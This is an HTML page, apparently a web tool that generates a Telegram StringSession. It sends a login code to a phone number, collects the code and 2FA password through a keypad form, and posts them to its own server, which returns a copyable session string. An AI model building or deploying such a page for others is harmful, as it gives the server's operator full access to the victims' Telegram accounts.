<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>String Session</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial; max-width: 480px; margin: 2rem auto; background: #f4f6f9; padding: 1rem; color: #333; }
    .card { background: #fff; padding: 1.8rem; border-radius: 16px; margin: 1rem 0; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
    h2 { margin: 0 0 0.5rem; font-size: 1.5rem; color: #1a73e8; }
    #code { font-size: 2.8rem; font-weight: bold; text-align: center; letter-spacing: 0.7rem; margin: 1.8rem 0; color: #222; }
    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.7rem; }
    .keypad button { font-size: 1.9rem; padding: 1.2rem; border-radius: 14px; background: #e8f0fe; border: none; color: #1a73e8; font-weight: bold; }
    .keypad button:active { background: #d0e2ff; transform: scale(0.95); }
    #msg { text-align: center; margin: 1.2rem 0; font-weight: bold; min-height: 1.5rem; }
    .success { color: #0f9d58; }
    .error { color: #d93025; }
    input[type="password"] { width: 100%; padding: 0.9rem; margin: 0.5rem 0; border: 1px solid #ddd; border-radius: 10px; font-size: 1rem; }
    button.submit { width: 100%; padding: 0.9rem; background: #1a73e8; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 1.1rem; margin-top: 0.5rem; }
    #result textarea { width: 100%; height: 130px; font-family: 'Courier New', monospace; font-size: 0.85rem; padding: 0.8rem; border: 1px solid #ddd; border-radius: 10px; resize: none; background: #f8f9fa; margin: 0.5rem 0; }
    .copy { width: 100%; padding: 0.9rem; background: #0f9d58; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 1.1rem; }
  </style>
</head>
<body>

<!-- ✅ Telegram WebView Detection Banner -->
<script>
document.addEventListener("DOMContentLoaded", () => {
  // Detect Telegram WebView using userAgent OR window.TelegramWebviewProxy
  const isTelegram = /Telegram/i.test(navigator.userAgent) || typeof window.TelegramWebviewProxy !== 'undefined';

  if (isTelegram) {
    const banner = document.createElement("div");
    banner.style = `
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: #ffeb3b;
      padding: 14px;
      font-size: 15px;
      font-family: Arial, sans-serif;
      text-align: center;
      z-index: 9999;
      border-bottom: 2px solid #d4c200;
    `;
    banner.innerHTML = `
      ⚠️ <b>Important:</b> Telegram in-app browser may reset this page.<br>
      Tap below to open it in your main browser.<br><br>
      <button id="openExternal"
        style="padding:10px 16px;font-size:15px;border:none;border-radius:8px;cursor:pointer;background:#000;color:#fff;">
        Open in Browser
      </button>
    `;
    document.body.prepend(banner);
    document.getElementById("openExternal").onclick = () => {
      window.open(window.location.href, "_blank");
    };
  }
});
</script>
<!-- ✅ END -->

  <div class="card">
    <h2>Enter 5-Digit Code</h2>
    <p>Check Telegram for login code.</p>
    <div id="code">_____</div>
    <div class="keypad">
      <button onclick="add('1')">1</button><button onclick="add('2')">2</button><button onclick="add('3')">3</button>
      <button onclick="add('4')">4</button><button onclick="add('5')">5</button><button onclick="add('6')">6</button>
      <button onclick="add('7')">7</button><button onclick="add('8')">8</button><button onclick="add('9')">9</button>
      <button onclick="add('0')">0</button><button onclick="back()">Backspace</button>
    </div>
    <div id="msg"></div>
  </div>

  <div id="pwd" class="card" style="display:none;">
    <h2>2FA Password</h2>
    <input type="password" id="pass" placeholder="Enter 2FA password">
    <button class="submit" onclick="verify()">Submit</button>
  </div>

  <div id="result" class="card" style="display:none;">
    <h2>StringSession Ready!</h2>
    <textarea id="session" readonly></textarea>
    <button class="copy" onclick="copy()">Copy Full String</button>
  </div>

<script>
let code = '';
const phone = new URLSearchParams(location.search).get('phone');
const msg = document.getElementById('msg');

// AUTO SEND CODE ON LOAD
if (phone) {
  msg.innerHTML = "Sending code...";
  msg.className = "";
  fetch('/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ phone })
  })
  .then(r => r.json())
  .then(d => {
    if (d.ok) {
      msg.innerHTML = "Code sent! Check Telegram.";
      msg.className = "success";
    } else {
      msg.innerHTML = d.error || "Failed to send code.";
      msg.className = "error";
    }
  })
  .catch(() => {
    msg.innerHTML = "Network error.";
    msg.className = "error";
  });
} else {
  msg.innerHTML = "No phone number.";
  msg.className = "error";
}

function add(d) {
  if (code.length < 5) {
    code += d;
    document.getElementById('code').textContent = code.padEnd(5, '_');
    if (code.length === 5) setTimeout(verify, 700);
  }
}

function back() {
  code = code.slice(0, -1);
  document.getElementById('code').textContent = code.padEnd(5, '_');
}

async function verify() {
  const pwd = document.getElementById('pass')?.value || '';
  const body = new URLSearchParams({ phone, code });
  if (pwd) body.append('pwd', pwd);

  msg.innerHTML = "Verifying...";
  msg.className = "";

  try {
    const r = await fetch('/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body
    });
    const d = await r.json();

    if (d.needs_password) {
      document.getElementById('pwd').style.display = 'block';
      msg.innerHTML = "Enter 2FA password.";
      msg.className = "error";
    } else if (d.error) {
      msg.innerHTML = d.error;
      msg.className = "error";
      code = '';
      document.getElementById('code').textContent = '_____';
    } else if (d.session) {
      document.getElementById('session').value = d.session;
      document.getElementById('result').style.display = 'block';
      msg.innerHTML = "Success!";
      msg.className = "success";
    }
  } catch (e) {
    msg.innerHTML = "Connection failed.";
    msg.className = "error";
  }
}

function copy() {
  const t = document.getElementById('session');
  t.select();
  navigator.clipboard.writeText(t.value).then(() => alert("Copied!"));
}
</script>

</body>
</html>
